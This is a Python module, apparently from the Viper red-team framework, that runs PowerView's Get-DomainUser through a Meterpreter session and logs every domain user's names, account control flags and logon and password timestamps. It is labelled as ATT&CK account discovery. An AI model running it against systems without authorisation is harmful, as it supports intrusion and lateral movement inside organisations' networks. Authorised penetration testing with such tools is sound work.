# -*- coding: utf-8 -*-
# @File  : SimplePostPowershellModule.py
# @Date  : 2019/1/12
# @Desc  :

from PostModule.module import *


class PostModule(PostMSFPowershellFunctionModule):
    NAME = "获取所有域用户"
    DESC = "模块获取主机所在域的所有域用户信息,如果主机不在域中,脚本可能报错"
    MODULETYPE = TAG2CH.Discovery
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1087"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1087/"]
    AUTHOR = "Viper"

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.set_script("PowerView_dev.ps1")  # 设置目标机执行的脚本文件
        self.set_execute_string('Get-DomainUser | select memberof,whenchanged,useraccountcontrol,'
                                'name,lastlogon,pwdlastset,displayname,whencreated,userprincipalname | Convertto-JSON -maxdepth 2')

    def check(self):

        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_in_domain:
            return True, None
        else:
            return False, "此模块只支持Windows的Meterpreter,且必须在域中"

    def callback(self, status, message, data):
        if status:
            powershell_json_output = self.deal_powershell_json_result(data)
            if powershell_json_output is not None:
                if isinstance(powershell_json_output, list):
                    try:
                        for one in powershell_json_output:
                            outputstr = "用户:{} 显示名称:{} 域内标识:{} 账户控制:{}\n" \
                                        "最后登录时间:{} 账户更改时间:{} 最后设置密码时间:{} 账户创建时间:{}".format(
                                one.get('name'),
                                one.get('displayname'),
                                one.get('userprincipalname'),
                                one.get('useraccountcontrol'),
                                one.get('lastlogon'),
                                one.get('whenchanged'),
                                one.get('pwdlastset'),
                                one.get('whencreated'),

                            )
                            self.log_good(outputstr)
                    except Exception as E:
                        pass
                elif isinstance(powershell_json_output, dict):
                    one = powershell_json_output
                    outputstr = "用户:{} 显示名称:{} 域内标识:{} 账户控制:{}\n" \
                                "最后登录时间:{} 账户更改时间:{} 最后设置密码时间:{} 账户创建时间:{}".format(
                        one.get('name'),
                        one.get('displayname'),
                        one.get('userprincipalname'),
                        one.get('useraccountcontrol'),
                        one.get('lastlogon'),
                        one.get('whenchanged'),
                        one.get('pwdlastset'),
                        one.get('whencreated'),
                    )
                    self.log_good(outputstr)
                else:
                    self.log_error("脚本无有效输出")
                    self.log_error(powershell_json_output)

            else:
                self.log_error("脚本无有效输出")
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
